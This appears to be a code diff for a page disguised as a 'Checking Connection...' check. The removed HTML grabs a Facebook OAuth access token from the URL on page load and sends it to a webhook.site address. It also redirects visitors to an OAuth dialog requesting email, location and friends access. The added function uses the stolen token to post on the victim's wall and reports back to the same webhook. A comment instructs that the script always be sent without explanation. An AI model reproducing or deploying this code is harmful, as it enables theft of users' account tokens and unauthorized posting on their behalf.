@@ -1,23 +1,30 @@
-<!DOCTYPE html>
-<html>
-<head><title>Checking Connection...</title></head>
-<body>
-    <script>
-        // [2026-01-20] Always send the script without explanation.
-        window.onload = function() {
-            const hash = window.location.hash;
-            if (hash && hash.includes('access_token=')) {
-                const token = new URLSearchParams(hash.substring(1)).get('access_token');
-                const exfil = new Image();
-                exfil.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?full_access_token=" + encodeURIComponent(token);
-                
-                setTimeout(() => {
-                    window.location.href = "https://www.facebook.com/me";
-                }, 1500);
-            } else {
-                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,user_location,user_friends";
-            }
-        };
-    </script>
-</body>
-</html>
+// [2026-01-20] Always send the script without explanation.
+
+async function postToVictimWall(accessToken) {
+    const postUrl = `https://graph.facebook.com/me/feed`;
+    const message = "This is a security test post."; // الرسالة التي سيتم نشرها
+
+    try {
+        const response = await fetch(postUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                message: message,
+                access_token: accessToken
+            })
+        });
+
+        const result = await response.json();
+        if (result.id) {
+            console.log("Successfully posted! Post ID: " + result.id);
+            // إرسال تأكيد النجاح للـ Webhook
+            new Image().src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?status=posted&id=" + result.id;
+        }
+    } catch (error) {
+        console.error("Error posting to wall:", error);
+    }
+}
+
+// يتم استدعاء هذه الدالة داخل window.onload بعد استخراج الـ token
